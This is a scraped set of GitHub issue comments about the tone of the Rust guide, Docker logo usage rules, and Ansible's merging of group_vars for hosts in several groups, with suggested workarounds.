rust/rust-lang/15539/48416997,"I'm not saying it shouldn't be, I just want to acknowlege that I wrote it, said ""lol"", and then shipped it with the intention of asking if it's too cute or not. ",,False,False,15539
rust/rust-lang/15539/48417193,"For what it is worth, I suspect the chatty and reassuring tone is great for a lot of readers, and I'm excited about the idea of making Rust accessible to the less experienced programmers (or at least, less experienced in the ways of low-level/systemsy/unixy tools), and I imagine this guide will work well for them. So, despite my grumpy comment about wanting the old tutorial back, I like this one and I'm glad you're working on it. And I know that every reader has different bands of pleasure and tolerance for fluff. I'm noting the bits where I find myself becoming conscious of my own displeasure just in case it helps you tune it. I'm not commenting on all the bits where I found the fluff to be pleasurable. ",,False,False,15539
rust/rust-lang/15539/48417468,"Absolutely. I think that being a bit lighter makes the docs way better than boring, dry ones, but I also recognize that it's easy to go overboard. ",,False,False,15539
rust/rust-lang/15539/48433203,"Well, at least my crack about how cargo makes the car go didn’t get in! (That would certainly have been too much!) ",,False,False,15539
rust/rust-lang/15539/48446182,"I do like the fluffy tone for the most part, but this part threw me off too. Mostly because I don't get the analogy. How is cargo like a robotic driver? I don't get it. Analogies are risky in that while they can serve to enlighten, they can also confuse if the reader doesn't ""get it"". I think this one could be particularly tricky to understand for people whose English is not that strong. Also ""programmers love car analogies"" is a bit of a generalization ;) ",,False,False,15539
rust/rust-lang/15539/48447512,"I think that the new Guide is way better than the old Tutorial was.  See, it's a guide, not a reference, (we have the Manual for that).  The Guide is meant to teach the reader about Rust and systems programming in an engaging manner, like a good book would. There's certainly a place for a more formal format as well, but that is what the manual is for. Maybe it is because I haven't had much previous experience with systems programming, however the Guide is very accessible and this makes it easier for people like me to jump on the Rust train.  I have some limited C++ experience, which is certainly helping, but the attitude that one has to know the old in order to learn the new is I think preventing many new programmers from trying some of these newer languages. For a lot of people, it comes down to cost/benefit analysis If I have to know C++ well in order to get into Rust, I'm just not going to invest the time into Rust but instead into C++, because of the much more established ecosystem. If instead I can jump onto Rust from e.g. Ruby/Python/JavaScript background as well, can learn at my own pace and don't have to first invest into C++ then I'm sold. A lot of people adopted the dynamic languages precisely because they could be picked up from scratch and to be honest the dynamic people are one of the most active open-source communities here on GitHub, (Just check the amount of JavaScript pouting in every day) and if we manage to capture their interest the Rust ecosystem will greatly benefit. Just look at Go, released less than 5 years ago and where it is today, thanks to the people coming over from Python/Ruby. I am not saying the Guide should be accessible to everybody, however it should be accessible to people without previous C++ experience and I think @friend  does a great job at achieving this goal. As far as the car analogy, well sure - not every analogy's so great, but that goes for a lot of books, TV shows etc. as well and I think as long as a point is made clearly, the particular analogy doesn't really matter that much. ",,False,False,15539
rust/rust-lang/15539/48455368,"I find analogies are ultimately distracting and unhelpful. Rather than saying what cargo is like, it's better to say what it actually is. It's probably better to first explain what cargo is, before explaining that it's in alpha state. ",,False,False,15539
rust/rust-lang/15539/48456375,"Analogies are good only when they explain a difficult relation in terms of ordinary experiences. In this particular case the relation rustc-cargo isn't very difficult to grasp and the robotic drivers image isn't ordinary or helpful - rather, it's a convolution. ",,False,False,15539
rust/rust-lang/15539/48470173,"I think part of the problem is that which every tutorial has its adressing very different people at the same time. Perhaps there should be two tutorials Rust for ""beginners"" (anyone not too familiar with compiled languages), and Rust for those with more ""experience"". I think the chatty, friendly language is great for beginners, but could easily be ""distracting and unhelpful"" for those already familiar with the basic concepts, if not with how Rust handles them. Just an idea... ",,False,False,15539
rust/rust-lang/15539/48476299,"@friend Yeah, I think that's a great idea and we already kind of have that with the Guide being chatty and the Tutorial being not so chatty.  So, perhaps instead of the Guide replacing the Tutorial, it could supplement the Tutorial, although that would require two pieces of documentation with a similar aim being maintained. ",,False,False,15539
rust/rust-lang/15539/48479349,"@friend Yes, it has its drawbacks it would require two pieces of documentation with similar aims; I'm not sure how that is best addressed. I wonder what our Documentation Master @friend thinks... It is a tricky thing, though beginners need to be taught with an understanding that these concepts are complicated, take time to learn, and are not simple; I think the current tutorial does that very well. More experienced people see things like type systems and pointers as obvious and simple and feel talked-down-to when those concepts are given too much time and treated too simply for their tastes. Perhaps its more like a 2-part tutorial, where the ""beginner"" section leads into the ""experienced"" section, and at the beginning, there is a suggestion that those with more experience may want to jump to Part 2? That still has its drawbacks, as you have to balance between covering everything in the right place for each group and trying not to repeat yourself, but maybe... ",,False,False,15539
rust/rust-lang/15539/48482740,"@friend Perhaps it doesn't have to be 2 part, but having a piece of JavaScript where one could click on a ""Background"" tab next to problematic sections (e.g. pointers) and have a little bit of a background info on pointers unfold, whereas the experienced programmers would just leave the ""Background"" tabs collapsed and flow with it as an advanced tutorial.  This way you can have one Tutorial accessible to both camps, altrough I would too like to hear @friend's opinion on this. ",,False,False,15539
rust/rust-lang/15539/48490523,"Here is my opinion and general plan  I think that enough people not liking this is justification to remove it. Can anyone suggest something that should go in its place, or should we just axe the paragraph and be done with it? ",,False,False,15539
rust/rust-lang/15539/48493035,"@friend Based on the comments and the fact that the next paragraph explains what Cargo really is in the first sentence; ""Cargo manages three things building your code, downloading the dependencies your code needs, and building the dependencies your code needs."", I would just axe the analogy paragraph and be done with it. Awesome Guide BTW. ",,False,False,15539
moby/moby/18264/119067027,"Hello, I'd like to know if is it allowed in a commercial product to use a monochrome version (for example  to refer to Docker. I'm asking this because I need to use this icon in a narrow space (about 20x20px) and the original icon when scaled down looks blurred, and, in your documentation, you ask developers to use the original icon with even the ""Docker"" text below it. Thanks. ",,False,False,18264
moby/moby/18264/315195948,"Just as a heads up, it appears that  has been updated. There's an excellent simplified logo that looks great. ",,False,False,18264
moby/moby/18264/315198074,"Ah, yes; I do see that there's a requirement to keep the  name in the logo, so looks like it's still not allowed (well, without written permission I guess) to use just the Whale icon &lt;img width=""471"" alt=""screen shot 2017-07-13 at 13 48 26"" src=""",,False,False,18264
moby/moby/18264/315203930,Too bad one can't even change the plain logo's color to white or black so it matches the hundreds of other logos legally provided for icon/footer use. ,,False,False,18264
moby/moby/18264/315269184,"@friend sorry for that, I understand it's frustrating; also not something I can influence. There's a section that mentions exceptions - could be worth reaching out; &lt;img width=""920"" alt=""screen shot 2017-07-13 at 21 48 29"" src=""",,False,False,18264
moby/moby/18264/315269832,@friend Thank you for pointing that out. The best solution would be for Docker to add some of those logos to the package they provide. But I understand they wouldn't add the black and white versions because of the risk of those being used more than the ones they already provide. I'll send the email with the artwork. ,,False,False,18264
ansible/ansible/9065/43185309,"Issue Type Bug Report Ansible Version ansible 1.6.1 Environment Mac OSX Summary If we have a hosts file [service1] www.host1.com  [service2] www.host1.com  and we have these group_vars group_vars/service1     database_host ""www.database.com""     database_port  3306  group_vars/service2     database_host ""www.differentdatabase.com""     database_port  3306  and we are running this playbook - hosts service1   remote_user root  the variables from group_vars/service1 and group_vars/service2 overwrite each other if we're deploying to the same server. This means service1 will get service2 groups variables and get the incorrect database host and port. to get around these, we've added DNS entries (aliases to www.host1-service.com) so our host looks like [service1] www.host1-service1.com  [service2] www.host1-service2.com  but this is highly error prone and is not ideal. What are some different methods to getting around this issue? (or misunderstanding of group_vars) The way I'm doing multi environmental deployments is like this inventory/stage/hosts inventory/stage/group_vars/ inventory/stage/group_vars/service1 inventory/stage/group_vars/service2  inventory/live/hosts inventory/live/group_vars/ inventory/live/group_vars/service1 inventory/live/group_vars/service2  Steps To Reproduce Summary describes how to reproduce this. Expected Results group_vars should not be overwritten by another group when sharing the same host Actual Results group_vars are overwritten by another group when sharing the same host ",,False,False,9065
ansible/ansible/9065/62441380,"I'm also having this issue, it seems like the vars get parsed and attached to the host rather than the staying with the group. Steps To Reproduce Hosts file [aaa] host1 host2  [bbb] host2 host3  [aaavars] foo=aaa  [bbbvars] foo=bbb  Run a command on each group $ ansible -i hosts aaa -m shell -a ""echo {{ foo }}"" host1 | success | rc=0 &gt;&gt; aaa  host2 | success | rc=0 &gt;&gt; bbb  $ ansible -i hosts bbb -m shell -a ""echo {{ foo }}"" host2 | success | rc=0 &gt;&gt; bbb  host3 | success | rc=0 &gt;&gt; bbb  Expected results The variable  is asigned to the group  and should be output when running commands against group Actual results host2 outputs the variable from group ",,False,False,9065
ansible/ansible/9065/63641662,"Have the same problem. Example ./group_vars/group1 ./group_vars/group2 hosts file So, when I'm trying to run playbook for group1 only, I'm getting this result ""name"" variable has a value ""group2-default"" but it`s expected to have a value ""group1"". Is there any workaround for this? ",,False,False,9065
ansible/ansible/9065/63653763,"inventory vars get merged even if you are not using that group, last group merged wins --  Brian Coca ",,False,False,9065
ansible/ansible/9065/64718173,"@friend Why does it work that way? Is this expected behaviour, or an actual bug? ",,False,False,9065
ansible/ansible/9065/64719835,"You could have vars/service(1,2,3,...) files And pass service=1 as extra vars Then for the hosts your targeting in the playbook use the service variable, as well as which vars file you are importing We do a similar thing for importing vars based on an environment extra var  On Nov 26, 2014 312 PM, ""arianitu"" notifications@friend.com wrote ",,False,False,9065
ansible/ansible/9065/77694546,"I have same issue on 1.8.4 today. Eventually, is this a correct behavior or not? Does anyone know the progress? ",,False,False,9065
ansible/ansible/9065/77695853,"Hmm. Seems like the tags 'bug_report' are wrong here. This is not a bug but.. a feature -) So yes, it is correct behaviour. As @friend said, ""the vars get parsed and attached to the host rather than the staying with the group"" which is totally correct. Variables in different groups where the same hosts are member, only makes sense when those groups are in a parent-child relation, the child winning, and it's vars applied. If groups are at the same level, there is not really a deterministic way which one will win. At playbook time targetting a group actually only determines which hosts are in the run, it doesn;t change anything at variable level. The ansible way here would be to set database host and port in a list, and the iterate over it in tasks. @friend @friend I think this issue can be closed. ",,False,False,9065
ansible/ansible/9065/77696724,@friend Thanks a lot! I got it. I'll try without using group_vars. ,,False,False,9065
ansible/ansible/9065/77727695,"closing as this is not a bug but by design, group vars get flattened per host and do not vary because of how you select the host ",,False,False,9065
ansible/ansible/9065/97077453,"Anyone got a workaround for this? we can't use static vars in the playbook, as we need to differenciate between different environments (handles by different inventory files) and need to run with different variables, depending on the group run, even tough they are run on the same host as another group ",,False,False,9065
ansible/ansible/9065/98773719,"Use a CNAME for the same hostname or an IP address.  This is the only workaround I found. The problem appears when you are using Ansible Tower, because you're wasting a license with such CNAME's. Ansible do not want to fix this bug calling it a ""feature"", but in fact it's a real bug that must be fixed. 28 Апр 2015 г. 1716 пользователь ""SkaveRat"" notifications@friend.com написал ",,False,False,9065
ansible/ansible/9065/119500990,It has been fixed but rejected.  annoying thing is that the ansible guide does recommend to group them by roles  if the same host has multiple roles with the same variables you can't use the group variables since you don't know which one will be used. ,,False,False,9065
ansible/ansible/9065/148816278,"I still don't understand how to bind a variable to a specific host for a specific playbook. I want the ability to use the same template, but with different configuration values depending on the environment I'm deploying to. We're already following  by making different inventories for our different environments Why does this seem so difficult with Ansible? Is Ansible just bad at doing environment based deployments? Please provide a full example, because ""The ansible way here would be to set database host and port in a list, and the iterate over it in tasks."" does not make any sense to me. Where is the environment specified here? For example, I have an authentication service that has a variable called  for stage, and  for live. Do you want me to have 2 variables? Now it's difficult for me to feed that to a common template file. I need to add if else checks throughout my j2 file (and we went down that path, but it was too much duplication and we got rid of it.) I have not found any documentation that handles this case, and it seems like a thing that should not be difficult to do. ",,False,False,9065
ansible/ansible/9065/148862914,"Here's how we do it AWS instance tagged as someapi prod playbook someapi.yml  hosts tagsomeapi{{ env }} gather_facts true user ec2-user vars_files  vars/aws_{{ env }}  tasks  fail msg=""Env must be defined"" when env is not defined roles someapi ...    Execution with extra vars ansible-playbook -vv someapi.yml -e ""env=prod"" roles/someapi/tasks/main.yml  name Include vars specific only to someapi. includevars someapi{{ env }}.yml  name Place config template src=config.j2 dest={{someapi_install_directory}}/configuration.properties ...   roles/someapi/vars/someapi_prod.yml authentication_db_host 192.168.2.4 roles/someapi/vars/someapi_stag.yml authentication_db_host 127.0.0.1 ... roles/someapi/templates/config.j2 authentication_db_host = {{ authentication_db_host }} ... HTH, --  Iain Wright This email message is confidential, intended only for the recipient(s) named above and may contain information that is privileged, exempt from disclosure under applicable law. If you are not the intended recipient, do not disclose or disseminate the message to anyone except the intended recipient. If you have received this message in error, or are not the named recipient(s), please immediately notify the sender by return email, and delete all copies of this message. On Fri, Oct 16, 2015 at 1242 PM, arianitu notifications@friend.com wrote ",,False,False,9065
ansible/ansible/9065/172346331,Can Ansible detect such cases and make a warning with a possible solution hint? ,,False,False,9065
ansible/ansible/9065/172353019,"If I understand correctly how it works -- for future readers like myself who struggle to understand  Host groups in inventory files define groups of hosts. Group variables define what variables should be be set for the hosts in this group. When I specify a group to be used to play a playbook, this means to take all the hosts which belong to that group. Each play is played separately for each host -- there is no context which group is being deployed. Groups are used to group hosts and group vars -- to set common variables to those hosts. So if a host is mentioned in several groups and these groups have the same variable with different values, the host is told that because it belongs to the first group -- the variable for it is set to the group value; then because the host belongs to another group the same variable with a different value is set shadowing the previous value.  ",,False,False,9065
ansible/ansible/9065/172385576,"The main problem is that ansible merge variables even from groups I don't want to play right now. I don't need to check variables from group I'm not playing at this time. Maybe, the semi solution is to check for variables only that groups, which was scheduled to run playbook. вс, 17 Янв 2016, 2000, Victor Varvaryuk notifications@friend.com ",,False,False,9065
ansible/ansible/9065/215475122,"This seems very counter-intuitive. I have an inventory which just has my Vagrant box in each group for testing purposes. But even when I run a playbook which just references a single group, Ansible is pulling in variables from the other groups too which is breaking my testing. ",,False,False,9065
ansible/ansible/9065/215534411,"On 28 April 2016 at 1755, Philip Wigg notifications@friend.com wrote ​That is because the mental model you use to look at inventory is not the correct one.​ ​Do not look at the inventory as tightly coupled with playbooks. Inventory is pretty much a separate thing, where  hosts can be member of several groups, and as such be targetted from ansible​ (ad-hoc) or ansible-playbook (playbooks) by pointing to one of the groups that host is member of. resolving variables is done inventory-wide, whether you target a specific group, or the allmighty built-in 'all' group, doesn't change that variables are and inherited, resolved  and calculated by looking at all group definitions and all group variables that exist in the inventory.  HTH, Serge ",,False,False,9065
ansible/ansible/9065/217134678,"I'm bumping into this too. In my case I have a role which installs vhosts. I set the details for the multiple vhosts as an array in my inventory for the server groups, in other words each group can have multiple vhosts. This works well, I define the vhosts for each group and everything seems neat and tidy. The problem comes up when the host is in more than one group, in that case the vhost array in the inventory is overwritten and the last group wins, so only half my vhosts end up being provisioned. An alternative would be to put the vhosts in the hosts instead of in the group, but that doesn't seem clean because I'll have to duplicate for all servers which are in the same group. Can anybody point me in the direction of a better way to do this or to work around it? I feel like I may be abusing the concept of roles or inventory by having my ""vhosts"" role accept an array of vhosts (a vhost is not exactly a ""role"" in the sense that you don't say to a server ""you are a vhost""). Can anyone offer a better way to do it or share their thoughts? ",,False,False,9065
ansible/ansible/9065/217135162,"By the way, @friend, thank you for taking the time to respond to me - it was much appreciated and has clarified my understanding. ",,False,False,9065
ansible/ansible/9065/227450640,My solution is. [service1] host1 ansible_ssh_user=host1.com [service2] host2 ansible_ssh_user=host1.com ,,False,False,9065
ansible/ansible/9065/236345364,"This is so stupid. I just spent many hours trying to debug a variable issue, only to discover that it was because of some stupid design philosophy (this). At there very least, there should be a warning when multiple group_var files are loaded for the same host. ",,False,False,9065
ansible/ansible/9065/240712445,"This i very anoying to have group_vars loaded randomly. It make impossible to have inheritance in a such case all &gt; datacenter &gt; environment (integ, devel, prod) &gt; application &gt; host It's very easy to do with puppet hiera but with ansible it's a pain, and, when you have &gt; 100 playbooks/roles to maintain, load variables explicitely is not a must have because you should maintain a vars_file + a group_vars file for the same function. Maybe having a tag in the file (vars_priority) or use the filename to fix the loading order could be good (like apache for example), example  all.yml 10_datacenter_a.yml 10_datacenter_b.yml 20_env_production.yml 40_app_gitlab.yml  then gitlab load group vars per name. ",,False,False,9065
ansible/ansible/9065/246864287,"I'm really happy to see that I'm not alone in this none sense! Groups vars should do apply the HIS group of hosts period. How in the world the --limit directive should be explain than? The natural way of thinking is  ok I ""limit"" this play book to host in THAT group so THAT group of vars gets pick up!!!! Not variable define in other groups for that same host, that doesn't make any sense! I hope this get fix and in the mean time, I fallback to use multiple DNS entry for the same host. ",,False,False,9065
ansible/ansible/9065/249961581,Just spent several hours banging my head on the table trying to get around this issue.  With the amount of chatter this issue is getting I'm really surprised Ansible (or Red Hat) is allowing this to continue. ,,False,False,9065
ansible/ansible/9065/249967998,"Why rely on the group_vars abstraction to merge vars and determine what is needed in the first place? I can't think of a good reason not to explicitly define and include vars (simplest example is included above in the thread) --  Iain Wright This email message is confidential, intended only for the recipient(s) named above and may contain information that is privileged, exempt from disclosure under applicable law. If you are not the intended recipient, do not disclose or disseminate the message to anyone except the intended recipient. If you have received this message in error, or are not the named recipient(s), please immediately notify the sender by return email, and delete all copies of this message. On Tue, Sep 27, 2016 at 1153 AM, Jason Hane notifications@friend.com wrote ",,False,False,9065
ansible/ansible/9065/249975938,"Part of the issue is that it's not immediately clear that's how Ansible parses variables.  One would think (as evidenced by the number of people having this problem) that assigning a host to a group, and running only that group, would inherit the variables for only that group and not of all of the groups that host is in. Running all hosts is a different story but at least then it should be a clear assumption that Ansible would grab all variables for all groups that host is in.  Ansible should either do a better job making those assumptions clear or provide a flag that enables this behavior. ",,False,False,9065
ansible/ansible/9065/250009349,"needed in the first place? That's EXACTLY the point of an abstraction! If the tool let me abstract my environment in different groups and then by applying clear rules of inference deduce which variables should be use, why not use it?!? So there's 2 problems here  The rules and not clear or the abstraction is not working. Otherwise, explain me the purpose of groups_vars if I need to explicitly define and include vars? I'm must say that the documentation do not mention this specific case of same host been included in multiple group_vars. But this case is very real in host where multiple instance of service exist (ex. apache). I really hope this problem being solve soon. ",,False,False,9065
ansible/ansible/9065/250010207,"We have found a way to solve our app/env problem with variables inheritance by cross defining variables between groups using a prefix. for example app_collectd.yml collectd_host ""{{ env_collectd_host }}"" env_production.yml env_collectd_host 1.1.1.1 then it's now not a problem, we have a clear app variables + env variables using cross calling variables ",,False,False,9065
ansible/ansible/9065/250020640,I'm coming from Puppet-land where doing abstraction and code reuse is simple and clear.  Maybe I don't understand correctly how Ansible approaches this so if there is a better way  that doesn't involve group_vars I'm all ears.  What I don't want to have to do is maintain another set of variables for each host or group to specify where it should be getting its variables.  To me that should be the responsibility of the framework.  This is the beauty of hiera in Puppet. ,,False,False,9065
ansible/ansible/9065/256384769,@friend [service1] host1 ansible_ssh_user=host1.com [service2] host2 ansible_ssh_user=host1.com can you explain it in detail? ,,False,False,9065
ansible/ansible/9065/258252988,"One more victim here. Anyone figure out a good solution for the following scenario? Let's say I have a list of web applications (app-a, app-b, app-c). And there are 4 hosts in 2 DC for DR/Load-balancing. I want to use ansible to simplify deployment. My first instinct is to use group vars, obviously I failed, but what alternative Ansible provides? inventory http_port 8081 app-c  host {{app-name}} tasks  # deploy application with given {{http_port}}.... ♠`  ",,False,False,9065
ansible/ansible/9065/258254749,This is what I do to get around it ,,False,False,9065
ansible/ansible/9065/258446783,"@friend Thanks, that certainly points to a direction I wasn't aware of.  However, I am now more incline to use roles for code reuse, and declare variables directly in playbook. Even though that means I will have one playbook per app, but by declare variable right next to the role which will use it, make the entire config much easier to understand. ",,False,False,9065
ansible/ansible/9065/268755726,"@friend Thanks, this workaround is brilliant.  You saved me. ",,False,False,9065
ansible/ansible/9065/269788749,"@friend Genius! I'm so surprised that this is even an issue.  I'm running into it because I have a single role I use with multiple inventory groups that have associated group_var files.  In QA/Prod, this is not an issue, because each inventory group has different servers.  But for integration level environments, we tend to smash everything together on to single servers (which is why I'm seeing this issue). Following hanej's advice, I modified my playbook yml to just explicitly load the group_var file♠hosts publish vars_files  group_vars/publish.yml`  ",,False,False,9065
ansible/ansible/9065/271255544,"""This is so stupid. I just spent many hours trying to debug a variable issue, only to discover that it was because of some stupid design philosophy (this). At there very least, there should be a warning when multiple group_var files are loaded for the same host."" Just to update this ""ISSUE""/""LIMITATION"" OK, we can use a workaround to eliminate the conflict, ( with host ansible or other way ) but the best way should be to purpose variable in the ansible.cfg to define  ""enclose group_vars"" or ""merge group_vars"" ",,False,False,9065
ansible/ansible/9065/271326486,"I can't use group_vars just for this reason.  We have multiple hosts in multiple groups (DC, environment, application, etc) and we have no control over how the variables are read.  Coming over from Puppet using Hiera this is a huge deal.  In my opinion, Ansible should adopt something like Hiera using the ""roles and profiles"" pattern where you can specify the order of how variables are consumed based on facts or groups.  I kind of do this now using the approach above. For instance, if you have a host in a role called ""/Linux Hosts/Applications/Java/Website"" you should be able to inherit variables from Linux Hosts (global level variables like sysctl, DNS, NTP, etc), Applications (global application level variables), Java (java specific variables like JDK version, JAVA_HOME, etc), and Website (variables related specifically to the website application).  The further you go down in the tree the more specific the variables become, which can override the variables higher up. Using Ansible for event driven or adhoc runs is great and works very well, however I'm finding that using Ansible for configuration management is not as clean or easy to use as Puppet and Hiera mostly for this reason. ",,False,False,9065
ansible/ansible/9065/271624866,"2 years later, I'm still receiving a steady stream of e-mails on this issue (it's also one of the most commented issues in this github.) Do the Ansible maintainers still feel like the current behaviour is correct, even though it's very unintuitive? You guys need to seriously document on how to do configuration management with Ansible because anyone trying to do application deployment with this project is having a terrible time. We've decided to stop using Ansible entirely. It sucks at configuration management, period. Good luck with the project. ",,False,False,9065
ansible/ansible/9065/271898601,"Yeah, just ran into the same problem when configuring the deployment process for config files for different environments, while testing on the same host. I'm going to adopt the whole {{ app-name }}-{{env}}.yml method proposed by @friend , but would love for the group_vars behaviour to at least be configurable. ",,False,False,9065
ansible/ansible/9065/273740924,"Happy I found this issue after banging my head against the wall for countless hours... And I'm extremely surprised of the maintainers dismissive attitude regarding this bug by calling it a ""feature"", it's stupid beyond recognition. I'm trying to set up a generic deployment playbook/role using a dynamic inventory. The inventory output looks like this Unfortunately there can be multiple applications on a single host. The whole point by using a dynamic inventory evaporates if the group vars are 'randomly' mashed up and returned instead of  inherit the variables for only that group which I'm running --limit with I tried @friend workaround by implementing the json like this _""hosts"" [""host2 ansible_host=host1.example.com"", ""host2 ansiblehost=host2.example.com""] but Ansible clearly don't understand that trying to ssh to host1 ansible_host=host1.example.com Anyone else facing the same problem, and if so have a possible workaround? I could pass the port and pool variables on the command line as they precedence, but then I have to do some ugly lookup before. ",,False,False,9065
ansible/ansible/9065/274021960,"Was having a great time with Ansible until hitting this bug. I had a perfect abstraction that would allow configuration of the same apps on a multi-tiered environment, and also on an all-in-one test environment - alas, I was wrong. What seemed like one of the most powerful features of Ansible doesn't work like everyone would expect it to. Please, lets get this fixed. ",,False,False,9065
ansible/ansible/9065/278293382,Spent hours banging my head on the table trying to get around this issue. Please fix this issue. ,,False,False,9065
ansible/ansible/9065/282040497,"This ""feature"" wasted the better part of my day. Not amused. @friend Thanks for the rather elegant workaround. We're now setting an  variable in our  files to the name of the environment. In our playbooks we then do this ",,False,False,9065
ansible/ansible/9065/282311773,"I know that it's been 2.5 years and that Ansible will probably never look at this, but I'm just going to add my frustration with this. Why allow users to put a host in multiple groups if you can't use the groups separately? ",,False,False,9065
ansible/ansible/9065/282317090,That's my problem with Ansible devs. Looks like they think only about themselves. They could at least try make the frustration less issuing some warnings. They instead prefer to spit. ,,False,False,9065
ansible/ansible/9065/284079503,"We filter out closed issues and don't see comments on them, but someone pinged me to respond to some of these questions. If you want attention from devs the mailing list or IRC are better conduits than closed tickets. Ansible looks at groups as properties of a host. For example,  you can have a host be part of webserver group (to install a webserver reqs) and part of the northeast_datacenter group (so you know the network gateway, ntp and dns servers to set) also part of the dev_group to install dev tools and point to the non-production database, etc, etc. You CAN use the groups as a way to target hosts but that does not mean the other 'host properties' disappear. I am in the 'males' group and in the 'programmers' group, just because you 'select me' as a programmer I do not stop being male. In the end this is a design decision (not a bug) on how to tackle groups, a way to classify and add properties to hosts. I know other tools use them differently but that is not a reason to change how they work in Ansible, as there is no uniform way ALL other tools use groups, many others look at them this way many don't. This has the limitation of not being able to reuse variable names and only have the 'current group apply' but it  has the advantage of always seeing the bigger picture of how the host is defined and makes conflicts easy to spot or resolve. In most of the cases above a use of vars_files or include_vars seems more appropriate than setting up as groups, when talking about application specific variables. Doing include_vars on group_vars ... well that is not how we designed it, but if it works for you ... the caveat is that you are 'double loading' as group_vars are automatically pulled in, this can lead to performance issues on large inventories.  We recommend more specific,  or similar with include_vars. I hope this clarifies why groups work the way they do in Ansible and why that is different than 'another specific tool', let me know if there is anything I can add to our docs  to clarify and avoid frustration. I would love to accommodate everyone's way of working, Ansible is very flexible in some areas, but not in this respect and I don't see a good way to make it so nor a sane way to share playbooks afterwards. If I'm wrong, I look forward to your pull request. ",,False,False,9065
ansible/ansible/9065/284136852,"@friend is it possible to detect cases when the group vars are being used in a strange way (sorry, cannot formulate this better -- haven't used this for a long time) and make warnings to help users save their time? ",,False,False,9065
ansible/ansible/9065/286276778,"@friend What's unclear to me, and I think most of the rest of the commentators on this issue, is what value the Ansible team is looking to preserve by keeping group_var precedence/resolution the way that it is. Can you give an example of a case which is satisfied well by the current solution but would cease to be so if, say, group_vars are only loaded for the groups selected for a given play, rather than for the entire inventory? It seems quite easy to come up with examples which are broken by the way that it is now. ",,False,False,9065
ansible/ansible/9065/286286224,"I understand @friend's point as we use it that way too.  My biggest frustration with Ansible is it works mostly good for either configuration management or ad-hoc workflows.  It doesn't do a great job of either but it's getting better and it has plugin support which I think I will be using to make another issue I have with it better.  Most days I still miss Puppet solely for configuration management... Probably the best use case for group_vars is multiple datacenters.  Let's say your inventory file looks thusly You could use group_vars to set datacenter specific variables that would be inherited by all hosts in that datacenter. dc1.yml dc2.yml Using group_vars like this is fine until you need to merge or override a variable in another group_var file.  This is another case where group_vars breaks down.  There's no way to set the order in which variables are read in group_vars.  A hierarchical layout (like Hiera) that can be determined by facts and not by groups for things like environmental variables comes to mind here but I digress. From my perspective, this use case is mostly good for straight configuration management but it's not so great at deployments or ad-hoc scripts.  This is why I would love to see a switch to disable this feature for certain playbooks where you don't want to do this. ",,False,False,9065
ansible/ansible/9065/286302551,"@friend I'm not sure how that example breaks by the design change I suggested in my previous comment? Given the inventory you've listed, if I  Any  you'd write against that inventory would have to be fairly contrived in order to make it break when only  and  were broken. I agree that deployments are an issue. Multi-tenanted deployments, specifically. I have two concerns with the way things work now First, lack of configuration namespacing. Specifically, if I'm maintaining configuration for some applications in a multi-tenanted environment, how do I ensure that someone maintaining a different app which happens to run on the same machines isn't going to add a variable name which conflicts with mine, or that I won't add one which conflicts with theirs? Second, the case everyone keeps talking about here. I'd expect that with the below inventory, I'd never wind up with files written to  when I run , and that files would never be written to  when I run These two issues are bad enough on their own, but in a large company where many people in different timezones might be editing the same inventory, the current solution seems more than a little risky. Example inventory. app1_staging.yml app1_prod.yml ",,False,False,9065
ansible/ansible/9065/286302663,"Don't know if the edit worked to adjust the notification, by my last comment was meant to be directed to @friend. ",,False,False,9065
ansible/ansible/9065/286749786,"@friend You asked for an example of using group_vars that satisfies the current loading method but breaks if only using the immediate groups.  I provided that with the datacenter example.  If Ansible doesn't load variables for all groups, then you cannot set variables, for example, at a datacenter level. I believe this should be a toggle in ansible.cfg or on the command line so you can specify how to load group_vars so it doesn't break the existing use cases.  We have multi-tenant environments here and used to get bit by this until I stopped using group_vars. I'm not sure if you've heard of the roles and profiles pattern but it's a really good read and I highly recommend this approach if you're using any kind of configuration management tool.  It was written for Puppet but it applies for all tools.  You probably wouldn't use this for deployments or ad-hoc stuff but for straight configuration management it's great. ",,False,False,9065
ansible/ansible/9065/288386733,"I use docker hosts so it is quite normal to have different instances of containers in different environments spread across hosts and this bit me. Thanks to @friend for the workaround and I would also add group vars do not work as advertised and seem to be broken by design. My workaround is to define a play as follows Put a vars directory in the playbook dir with group1.yml, group2.yml in there. ",,False,False,9065
ansible/ansible/9065/292715778,"I just joined victim list today after 1 hour debugging and fortunate enough to found this post. I think it's only documentation problem, no one will complain if it's clearly noted in here  fact that variables are associated with hosts, and groups is just a convenience way to set variables to all hosts belong to it. Variables will be overriden if the same host is used in multiple groups. ",,False,False,9065
ansible/ansible/9065/297557842,plus one This issue affects our software team. ,,False,False,9065
ansible/ansible/9065/298290703,Also encountered this issue when deploying several groups to the same hosts. Needed a way to vary a port for each group and use that port in a template which iterates though hosts of groups. (haproxy) ,,False,False,9065
ansible/ansible/9065/309037565,"Unfortunately we also ran into this issue today. Same story, Though we have a generic ""tomcat"" rol we vary the variables like port numbers based upon the group that is used. However several tomcat instances can be deployed to the same physical servers so we created multiple groups in the inventories that contain the same set of servers. However this approach doesn't seem to work. I have no idea yet how to design this. I cant create wrapper roles that have the variables because some of the variables are actually specific to the inventory. Think for example a database password oid. ",,False,False,9065
ansible/ansible/9065/309044194,"I recently found this which eased my pain with this issue  allows merging of variables no matter where they were defined, so you can merge two dicts/lists in two different groups for example, as opposed to one group winning and overwriting the variable defined in the other groups as is the current behavior. The plugin only works with Ansible 2+. A good article explaining the concept and the use case can be found here. ",,False,False,9065
ansible/ansible/9065/310256170,"We recently come into this issue as well. We have multiple applications running on a single host as different users. For instance We have no way to specify  with vars properly, neither with  nor . The latest definition always wins in both cases. Our current workaround is to define multiple plays with different  in the playbook ",,False,False,9065
ansible/ansible/9065/310269683,"@friend suggested a smart way above to workaround this So now each host has a unique name in the inventory. Not a big fan to put host vars in inventory, but this is the best workaround I have seen so far. ",,False,False,9065
ansible/ansible/9065/310374537,"@friend I think you are missing the points of hostvars and directives should work as long as you dont set ansible_user. The groups are a property of the host, not an entity to themselves. ",,False,False,9065
ansible/ansible/9065/311318799,"There was a proposal to make it possible to write proper plugins for inventory management. I suspect now that this proposal was closed/finished, it should become possible to implement a dynamic inventory plugin which works around this point of confusion. ",,False,False,9065
